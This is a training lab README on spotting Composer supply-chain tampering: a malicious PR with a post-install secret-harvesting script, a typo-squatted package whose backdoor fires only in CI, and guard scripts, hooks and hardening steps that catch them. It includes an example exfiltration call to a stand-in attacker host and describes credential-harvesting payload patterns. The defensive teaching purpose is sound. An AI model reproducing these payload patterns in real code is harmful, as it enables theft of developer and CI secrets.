# Lab 3 — Detecting Malicious Changes (Git / PR / Supply-Chain Tampering)

**Goal:** Recognize supply-chain tampering of the *dependency layer* (malicious PRs, post-install scripts, typo-squatted packages, plugin allowlist abuse, lockfile drift) and harden the repository against a "single person writes code and pushes it to production alone" workflow — the core A03 separation-of-duties failure.

## Files

- The suspicious "PR": `/lab3-malicious-changes/vulnerable/pr.diff` — applies on the pristine project
- Pristine project: `/lab3-malicious-changes/vulnerable/demo/composer.json`
- Simulated malicious payload (SAFE — local writes only):
  - `/vulnerable/laravell-support/` — typo-squat of `laravel`: backdoor that only **fires when `CI=true`** (the Bybit-attack pattern)
  - `/vulnerable/tools/collect-env.php` — Shai-Hulud-style `post-install-cmd` harvesting env; writes to `.loot/exfil.json` instead of exfiltrating
- Guards: `/lab3-malicious-changes/fixed/`
  - `composer-guard.php` — diffs composer.json/composer.lock and FAILs on scripts/repos/allow-plugins changes, typosquats, untrusted dist URLs, lockfile drift
  - `hooks/pre-commit` — installs the guard as a git hook
  - `composer-workflow.yml` — hardened CI: `composer install --no-scripts`, pinned action, least-priv token, audit gate
  - `dependabot.yml` — weekly composer update PRs to `security-lead`
  - `CODEOWNERS` — composer.json / lock / workflows always need security review

## Lab Steps

### 1. Review the "PR" like a human

```powershell
cd A032025-Software-Supply-Chain-Failures\lab3-malicious-changes
cd vulnerable\demo
git init; git add .; git commit -m "base state"
git apply ..\pr.diff
git diff
git add -A   # now look at what is about to be committed
```

Wait — in a real PR review you'd see exactly this diff for 30 seconds while 20 other PRs wait. Red flags to hunt:

| Red flag | What you find |
|---|---|
| `"post-install-cmd"` | `php tools/collect-env.php` — runs on EVERY developer's machine on install |
| New dependency | `laravell/support` — one keystroke from `laravel` (typo-squat) |
| New `"repositories"` | path repo pointing at the package's own source (bypasses Packagist) |
| CI-conditional logic | `if (getenv('CI') === 'true')` — payload wakes only in build env |

### 2. Play the payload (safe)

```powershell
php ..\tools\collect-env.php
Get-Content .loot\exfil.json   # password/token/secret key names it collected
```

The real version would ship this to a remote host with `file_get_contents("https://attacker?data=...")` and reuse your `COMPOSER_TOKEN`/`GITHUB_TOKEN` to attack other repos — exactly the 2025 Shai-Hulud npm worm model, which works identically in Composer.

### 3. Automate the review (the part humans are bad at)

```powershell
php ..\..\fixed\composer-guard.php ci HEAD~1
# exit code 1, output:
# [FAIL] composer.json: change to "scripts" detected
# [FAIL] composer.json: change to "repositories" detected
# [FAIL] possible typosquat: "laravell/support" - "laravell" is only 1 edits away from "laravel"
```

Install it as a git hook so the malicious commit never even lands:

```powershell
Copy-Item ..\..\fixed\hooks\pre-commit .git\hooks\pre-commit -Force
Copy-Item ..\..\fixed\composer-guard.php . -Force
php ..\..\fixed\composer-guard.php hook   # what the hook runs (staged diff)
```

### 4. Repo hardening checklist (GitHub)

- Branch protection on `main`:
  - Require PR + **2 approvals** for dependency trips (separation of duties — A03 hard requirement)
  - Require status checks: `composer-security-gates`
  - Require **signed commits**, dismiss stale approvals, block force push
- `CODEOWNERS`: any `composer.json`/`composer.lock`/`workflows` change auto-requests security review
- Actions: pin third-party actions **by SHA**, set `permissions: contents: read`, no `pull_request_target` on fork PRs
- Registry hygiene: check maintainers/downloads/GitHub activity of the package on Packagist; search [GitHub Advisory DB](https://github.com/advisories) for the package name before adding
- Keep `composer install --no-scripts` in CI; scripts (if any) must ship **in-repo**, reviewed

## CWE

- CWE-1357: Reliance on Insufficiently Trustworthy Component
- CWE-1329: Reliance on Component That is Not Updateable (unreviewed, unpinnable registry changes)
- CWE-1035: Using Components with Known (or Injected) Vulnerabilities
